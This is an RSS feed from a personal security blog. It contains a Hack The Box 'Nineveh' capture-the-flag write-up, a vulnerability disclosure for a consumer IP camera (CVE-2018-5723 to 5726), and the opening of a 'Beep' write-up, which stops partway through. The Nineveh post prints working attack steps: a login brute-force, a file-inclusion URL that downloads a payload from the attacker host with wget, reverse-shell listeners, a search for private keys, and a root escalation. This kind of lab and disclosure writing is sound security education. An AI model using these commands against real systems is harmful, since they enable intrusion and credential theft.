<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Syrion</title>
    <description></description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Tue, 07 Apr 2020 11:49:11 +0200</pubDate>
    <lastBuildDate>Tue, 07 Apr 2020 11:49:11 +0200</lastBuildDate>
    <generator>Jekyll v3.8.5</generator>
    
      <item>
        <title>Nineveh Writeup</title>
        <description>&lt;p&gt;Let’s start with NMAP:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nmap -sT -sV 10.10.10.43 -p 1-65535 -A

Starting Nmap 7.60 ( https://nmap.org ) at 2018-02-06 04:37 EST
Stats: 0:00:22 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 1.25% done; ETC: 04:51 (0:13:07 remaining)
Nmap scan report for 10.10.10.43
Host is up (0.12s latency).
Not shown: 65533 filtered ports
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_ssl-date: TLS randomness does not represent time
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.8 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.8 (92%), Linux 3.8 - 3.11 (92%), Linux 4.4 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   116.13 ms 10.10.14.1
2   131.37 ms 10.10.10.43

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 292.82 seconds

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After enumerated HTTP and HTTP I found:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# dirsearch.py --url http://nineveh.htb -w /usr/share/seclists/Discovery/Web_Content/raft-large-directories.txt -e php,txt,db,js

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: php, txt, db, js | Threads: 10 | Wordlist size: 62279

Error Log: /opt/dirsearch/logs/errors-18-02-06_04-45-25.log

Target: http://nineveh.htb

[04:45:25] Starting: 
[04:46:04] 403 -  299B  - /server-status
[04:46:23] 301 -  315B  - /department  -&amp;gt;  http://nineveh.htb/department/
[04:46:43] 200 -  178B  - /

Task Completed
root@kali:~# dirsearch.py --url https://nineveh.htb -w /usr/share/seclists/Discovery/Web_Content/raft-large-directories.txt -e php,txt,db,js

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: php, txt, db, js | Threads: 10 | Wordlist size: 62279

Error Log: /opt/dirsearch/logs/errors-18-02-06_04-59-00.log

Target: https://nineveh.htb

[04:59:01] Starting: 
[04:59:04] 301 -  309B  - /db  -&amp;gt;  https://nineveh.htb/db/
[04:59:41] 403 -  300B  - /server-status
[05:00:21] 200 -   49B  - /

Task Completed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There was phpLiteAdmin v1.9 on https://nineveh.htb/db/index.php:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2018-02-05-htb-nineveh/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I tried to bruteforce the login with hydra:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hydra -l '' -P rockyou.txt nineveh.htb https-post-form &quot;/db/index.php:password=^PASS^&amp;amp;remember=yes&amp;amp;login=Log+In&amp;amp;proc_login=true:Incorrect password.&quot;
[443][http-post-form] host: nineveh.htb   password: password123
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I found &lt;a href=&quot;https://www.exploit-db.com/exploits/24044/&quot;&gt;this&lt;/a&gt; vulnerability but it didn’t work because the path of the saved db (/var/tmp/syrion.php) was not in the directories of the web server. I tried to move the db in /var/www/, /var/www/html and /var/www/ssl but I got this error:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Warning: copy(/var/www/html/syrion.php): failed to open stream: Permission denied in /var/www/ssl/db/index.php on line 1259
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So the application didn’t have the permissions for write there.&lt;/p&gt;

&lt;p&gt;At this point I tried to bruteforce the login in http://nineveh.htb/department :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2018-02-05-htb-nineveh/img2.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The credentials were admin:1q2w3e4r5t.&lt;/p&gt;

&lt;p&gt;After some enumeration of the web app I found something like an LFI in http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt,
I tried to include my db /var/tmp/syrion.php (but it didn’t work.&lt;/p&gt;

&lt;p&gt;By rename the db ninevehNotes1.php I was able to incude my shell and execute command:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2018-02-05-htb-nineveh/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the source code of the page there was this check:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if(!strpos($file, &quot;ninevehNotes&quot;))
    exit(&quot;No Note is selected.&quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I uploaded a reverse shell with wget and then include it:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://nineveh.htb/department/manage.php?notes=/var/tmp/ninevehNotes1.php&amp;amp;cmd=wget%20http://10.10.14.6:8000/syrion%20-O%20/var/tmp/ninevehNotes2.php

http://nineveh.htb/department/manage.php?notes=/var/tmp/ninevehNotes2.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And I got a reverse shell:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nc -lvp 4444
listening on [any] 4444 ...
connect to [10.10.14.6] from nineveh.htb [10.10.10.43] 50710
Linux nineveh 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 08:31:57 up  3:45,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3.5 -c &quot;import pty;pty.spawn('/bin/bash')&quot;
www-data@nineveh:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From the sshd_config file we knew that the user could access ssh with a private key, so I start to enumerate the sistem in order to find this key:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@nineveh:/etc/ssh$ find / -xdev -type f -print0 | xargs -0 grep -H &quot;BEGIN RSA PRIVATE KEY&quot;
&amp;lt;find / -xdev -type f -print0 | xargs -0 grep -H &quot;BEGIN RSA PRIVATE KEY&quot;     

Binary file /var/www/ssl/secure_notes/nineveh.png matches
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Mmm was the private key hidden in the png?&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop# binwalk -e  nineveh.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced
84            0x54            Zlib compressed data, best compression
2881744       0x2BF8D0        POSIX tar archive (GNU)


root@kali:~/Desktop# cd _nineveh.png.extracted/
root@kali:~/Desktop/_nineveh.png.extracted# ls
2BF8D0.tar  54  54.zlib  secret
root@kali:~/Desktop/_nineveh.png.extracted# cd secret/
root@kali:~/Desktop/_nineveh.png.extracted/secret# ls
nineveh.priv  nineveh.pub
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ok I got the private key, but there was no ssh in the nmap scan. After a bit of enumeration I found this configuration file:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@nineveh:/etc$ cat knockd.conf
cat knockd.conf
[options]
 logfile = /var/log/knockd.log
 interface = ens33

[openSSH]
 sequence = 571, 290, 911 
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I needed to send the knock sequence to open the ssh port, I did it with nmap:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;for x in 571 290 911 ; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 10.10.10.43; done
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At this point I was the user amrois:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/_nineveh.png.extracted/secret# ssh amrois@10.10.10.43 -i nineveh.priv 
Ubuntu 16.04.2 LTS
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

133 packages can be updated.
66 updates are security updates.


You have mail.
Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14
amrois@nineveh:~$ id
uid=1000(amrois) gid=1000(amrois) groups=1000(amrois)
amrois@nineveh:~$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There was an insteresting file in the crontab:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;amrois@nineveh:/tmp$ crontab -l
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command
*/10 * * * * /usr/sbin/report-reset.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;amrois@nineveh:/tmp$ cat /usr/sbin/report-reset.sh
#!/bin/bash

rm -rf /report/*.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;amrois@nineveh:/tmp$ ls -lah /report/
total 64K
drwxr-xr-x  2 amrois amrois 4.0K Feb  6 11:06 .
drwxr-xr-x 24 root   root   4.0K Jul  2  2017 ..
-rw-r--r--  1 amrois amrois 4.8K Feb  6 11:00 report-18-02-06:11:00.txt
-rw-r--r--  1 amrois amrois 4.8K Feb  6 11:01 report-18-02-06:11:01.txt
-rw-r--r--  1 amrois amrois 4.8K Feb  6 11:02 report-18-02-06:11:02.txt
-rw-r--r--  1 amrois amrois 4.8K Feb  6 11:03 report-18-02-06:11:03.txt
-rw-r--r--  1 amrois amrois 4.8K Feb  6 11:04 report-18-02-06:11:04.txt
-rw-r--r--  1 amrois amrois 4.8K Feb  6 11:05 report-18-02-06:11:05.txt
-rw-r--r--  1 amrois amrois 4.8K Feb  6 11:06 report-18-02-06:11:06.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After a research on google I discovered that the reports were generated by chkrootkit. Because of crontab, I supposed it was vulnerable to &lt;a href=&quot;https://www.exploit-db.com/exploits/33899/&quot;&gt;this&lt;/a&gt; exploit. As described I created a file in /tmp that execute a python reverse shell called update and I got it:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nc -vlp 5555
listening on [any] 5555 ...
connect to [10.10.14.6] from nineveh.htb [10.10.10.43] 60862
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;:-)&lt;/p&gt;
</description>
        <pubDate>Mon, 05 Feb 2018 22:30:00 +0100</pubDate>
        <link>http://localhost:4000/blog/htb-nineveh/</link>
        <guid isPermaLink="true">http://localhost:4000/blog/htb-nineveh/</guid>
        
        <category>hackthebox</category>
        
        
        <category>blog</category>
        
      </item>
    
      <item>
        <title>Master IP CAM 01 Vulnerabilities</title>
        <description>&lt;p&gt;Some time ago I analized this ipcam with my friend &lt;a href=&quot;https://twitter.com/dzonerzy&quot;&gt;Dzonerzy&lt;/a&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2018-01-15-master-ipcam/img1.jpg&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2018-01-15-master-ipcam/img2.jpg&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var serialNum=&quot;VVVIPCSBC150617Z-06929VjmJH54vkK&quot;;
var model=&quot;RT_IPC&quot;;
var hardVersion=&quot;5900-gc1004&quot;;
var softVersion=&quot;V3.3.4.2103-S50-SBC-B20150721E&quot;;
var ipcname=&quot;WIFICAM&quot;;
var startdate=&quot;2017-8-5 0:0:2&quot;;
var runtimes=&quot;0 day, 0:54&quot;;
var sdstatus=&quot;Ready&quot;;
var sdfreespace=&quot;3400608 &quot;;
var sdtotalspace=&quot;3969024 &quot;;
var builddate=&quot;Jul 20 2015 &quot;;
var productmodel=&quot;null&quot;;
var vendor=&quot;RTJ&quot;;
var swver=&quot;&quot;;
var hwver=&quot;&quot;;
var mppver=&quot;mpp&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We found some vulnerabilities but we might find much more in the next days.&lt;/p&gt;

&lt;p&gt;In this first article we will describe:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5724&quot;&gt;[CVE-2018-5724]&lt;/a&gt; Unauthenticated Configuration Download and Upload&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5723&quot;&gt;[CVE-2018-5723]&lt;/a&gt; Hardcoded Password for Root Account&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5725&quot;&gt;[CVE-2018-5725]&lt;/a&gt; Unauthenticated Configuration Change&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5726&quot;&gt;[CVE-2018-5726]&lt;/a&gt; Unauthenticated Sensitive Information Disclousure&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I will update this post with the new vulnerabilities we will found.&lt;/p&gt;

&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;First of all we ran nmap:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Stone:~ syrion$ nmap 192.168.1.124 -sV -sT -p 1-65535

Starting Nmap 7.40 ( https://nmap.org ) at 2017-12-23 17:41 CET
Nmap scan report for 192.168.1.124
Host is up (0.026s latency).
Not shown: 65528 closed ports
PORT      STATE SERVICE        VERSION
23/tcp    open  telnet         BusyBox telnetd
80/tcp    open  http           thttpd 2.25b 29dec2003
554/tcp   open  rtsp           HiLinux IP camera rtspd V100R003 (VodServer 1.0.0)
1018/tcp  open  soap           gSOAP 2.8
1235/tcp  open  mosaicsyssvc1?
8840/tcp  open  rtsp
60075/tcp open  unknown

Service Info: Host: RT-IPC; Device: webcam

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.44 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There were different services running on the camera but we started from the webapp.&lt;/p&gt;

&lt;p&gt;There was a login page where we could login with admin:admin&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2018-01-15-master-ipcam/img3.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Obviously every request was in HTTP (LOL).&lt;/p&gt;

&lt;p&gt;The web application had not so much functionality but after some researches on google we found &lt;a href=&quot;http://www.themadhermit.net/wp-content/uploads/2013/03/FI9821W-CGI-Commands.pdf&quot;&gt;this&lt;/a&gt; manual with a lot of cgi command like the one we found in our ipcam.&lt;/p&gt;

&lt;h2 id=&quot;cve-2018-5724-unauthenticated-configuration-download-and-upload&quot;&gt;[CVE-2018-5724] Unauthenticated Configuration Download and Upload&lt;/h2&gt;

&lt;p&gt;We could download the configuration file:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2018-01-15-master-ipcam/img7.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The first step was uncompressing the config_backup.bin file:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Stone:Desktop syrion$ tar xvf config_backup.bin 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There were a lot of configuration files. But let’s look at the webserver.conf:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;port=80 user=root cgipat=cgi-bin/** nosymlink globalpasswd debug cgilimit=30
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From nmap we knew the webserver was thttpd 2.25b 29dec2003, so after read the &lt;a href=&quot;https://acme.com/software/thttpd/thttpd_man.html&quot;&gt;manual&lt;/a&gt; we discovered how to change the root directory of the webserver, so we modified the configuration file as follow:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;port=80 user=root dir=/etc/ nosymlink globalpasswd debug cgilimit=30
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ok at this point we only needed something to upload the new configuration file. The &lt;a href=&quot;http://www.themadhermit.net/wp-content/uploads/2013/03/FI9821W-CGI-Commands.pdf&quot;&gt;manual&lt;/a&gt; helped us again:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2018-01-15-master-ipcam/img8.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It worked and after some minutes the ipcamera was online again:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2018-01-15-master-ipcam/img9.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;cve-2018-5723-hardcoded-password-for-root-account&quot;&gt;[CVE-2018-5723] Hardcoded Password for Root Account&lt;/h2&gt;

&lt;p&gt;Good, we got the passwd file with the password hash for user root:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root:$1$xFoO/s3I$zRQPwLG2yX1biU31a2wxN/:0:0::/root:/bin/sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With John we cracked it:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2018-01-15-master-ipcam/img10.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And yes, we got root:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2018-01-15-master-ipcam/img11.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;cve-2018-5725-unauthenticated-configuration-change&quot;&gt;[CVE-2018-5725] Unauthenticated Configuration Change&lt;/h2&gt;

&lt;p&gt;Without any authentication we could change the port where the server was running:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2018-01-15-master-ipcam/img4.png&quot; alt=&quot;Screenshot&quot; /&gt;
&lt;img src=&quot;/images/2018-01-15-master-ipcam/img5.png&quot; alt=&quot;Screenshot&quot; /&gt;
&lt;img src=&quot;/images/2018-01-15-master-ipcam/img6.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;cve-2018-5726-unauthenticated-sensitive-information-disclousure&quot;&gt;[CVE-2018-5726] Unauthenticated Sensitive Information Disclousure&lt;/h2&gt;

&lt;p&gt;That was so magic:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2018-01-15-master-ipcam/img12.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/43693/&quot;&gt;https://www.exploit-db.com/exploits/43693&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5723&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5723&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5724&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5724&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5725&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5725&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5726&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5726&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Mon, 15 Jan 2018 22:00:00 +0100</pubDate>
        <link>http://localhost:4000/blog/master-ipcam/</link>
        <guid isPermaLink="true">http://localhost:4000/blog/master-ipcam/</guid>
        
        <category>pentest</category>
        
        
        <category>blog</category>
        
      </item>
    
      <item>
        <title>Beep Writeup</title>
        <description>&lt;p&gt;Hello,&lt;/p&gt;

&lt;p&gt;this is my first writeup for Hack The Box platform, the machine was &lt;a href=&quot;https://www.hackthebox.eu/home/machines/profile/5&quot;&gt;Beep&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Let’s run nmap to see which services are running on the machine:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nmap -sT -sV -p 1-65535 10.10.10.7 -A

Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-08 12:27 EST
Nmap scan report for beep.localdomain (10.10.10.7)
Host is up (0.087s latency).
Not shown: 65519 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
25/tcp    open  smtp       Postfix smtpd
80/tcp    open  http       Apache httpd 2.2.3
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
111/tcp   open  rpcbind    2 (RPC #100000)
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
746/tcp   open  status     1 (RPC #100024)
993/tcp   open  ssl/imap   Cyrus imapd
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax    HylaFAX 4.3.10
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There were a lot of services.&lt;/p&gt;

&lt;p&gt;On port 443 there was Apache with elastix:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2018-01-08-htb-beep/img1.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By using dirsearch I enumerated it’s directories:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:/usr/share/wordlists/SecLists/Discovery/Web_Content# dirsearch -u https://10.10.10.7/ -w raft-medium-directories.txt -e php,txt

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: php, txt | Threads: 10 | Wordlist size: 30005

Error Log: /opt/dirsearch/logs/errors-18-01-08_15-16-00.log

Target: https://10.10.10.7/

[15:16:01] Starting: 
[15:16:02] 301 -  309B  - /admin  -&amp;gt;  https://10.10.10.7/admin/
[15:16:02] 301 -  310B  - /images  -&amp;gt;  https://10.10.10.7/images/
[15:16:02] 301 -  311B  - /modules  -&amp;gt;  https://10.10.10.7/modules/
[15:16:02] 301 -  310B  - /themes  -&amp;gt;  https://10.10.10.7/themes/
[15:16:03] 301 -  308B  - /help  -&amp;gt;  https://10.10.10.7/help/
[15:16:05] 301 -  307B  - /var  -&amp;gt;  https://10.10.10.7/var/
[15:16:05] 301 -  308B  - /mail  -&amp;gt;  https://10.10.10.7/mail/
